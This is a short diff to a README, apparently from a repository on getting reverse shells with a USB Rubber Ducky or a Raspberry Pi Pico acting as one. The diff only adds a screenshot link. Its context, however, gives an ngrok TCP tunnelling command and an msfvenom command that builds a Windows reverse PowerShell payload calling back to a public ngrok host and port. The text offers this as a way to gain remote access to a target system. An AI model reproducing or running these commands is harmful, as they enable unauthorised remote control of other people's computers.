@@ -6,8 +6,8 @@ The USB Rubber Ducky is a type of programmable USB device which looks like a reg
 To obtain a reverse shell from a target machine, you can utilize the MSFVenom tool to generate a Windows reverse PowerShell payload. This payload will allow you to establish a connection back to your machine, giving you remote access to the target system<br><br>
 For port forwarding
 ```ngrok tcp 8080```<br><br>
-![ngrok](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok.png)
-
+![ngrok](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok.png)<br><br>
+![ngrok1](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/ngrok1.png)<br><br>
 ```msfvenom -p cmd/windows/reverse_powershell lhost=0.tcp.in.ngrok.io lport=10448 > ayush.bat ```<br><br>
 ## Rasberry pi pico w as rubber ducky
 1. Clone the repo to get a local copy of the files. `git clone https://github.com/dbisu/pico-ducky.git`
